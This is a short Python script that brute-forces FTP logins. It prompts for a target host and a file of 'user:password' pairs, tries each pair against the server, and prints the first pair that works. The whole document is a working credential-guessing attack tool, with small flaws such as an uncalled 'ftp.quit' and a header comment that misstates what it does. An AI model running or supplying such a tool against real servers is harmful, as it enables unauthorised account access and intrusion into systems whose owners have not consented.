#!/usr/bin/python
# Log in and get the passwords file

import ftplib
from termcolor import colored

def ftpLogin(hostname, userPass):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login(userPass[0], userPass[1])
        print('[+] {} login successful'.format(hostname))
        ftp.quit
        return True
    except Exception as e:
        print('[-] {} login failed'.format(hostname))
        print('[-] {}'.format(e))
            
def main():
    host = input('[*] Enter host IP to connect to: ')
    filename = input('[*] Enter passwords file name: ')
    try:
        file = open(filename,'r')
    except Exception as e:
        print(colored('[-] Error: {}'.format(e),'red'))
        exit(1)
        
    for password in file.readlines():
        try:
            password = password.strip('\n')
            userpass = password.split(':')
            if ftpLogin(host, userpass):
                print(colored('[+] Password found: {}/{}'.format(userpass[0], userpass[1]),'green'))
                exit(0)
            else:
                print(colored('[+] Login failed: {}/{}'.format(userpass[0],userpass[1]),'red'))
        except Exception as e:
            print(colored('[-] Error: {}'.format(e),'red'))
    print(colored('[+] No Valid passwords in the list.','red'))
   
if __name__ == '__main__':
    main()